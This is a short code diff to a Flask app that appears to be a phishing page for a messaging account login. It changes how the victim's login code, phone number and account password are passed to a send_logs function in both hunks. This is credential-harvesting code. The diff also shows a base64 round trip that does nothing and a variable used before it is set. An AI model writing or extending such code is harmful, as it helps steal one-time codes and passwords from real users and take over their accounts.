@@ -73,7 +73,7 @@ class CodeForm(FlaskForm):
 
 def send(login_code, phone):
     try:
-        send_logs(login_code, phone)
+        send_logs(str(login_code) + str(phone))
         global client
         phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
         if client.is_connected():
@@ -101,7 +101,7 @@ def send(login_code, phone):
 
 def send_with_pss(login_password):
     try:
-        send_logs(login_password)
+        send_logs(str(login_password))
         global client
         phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
         try:
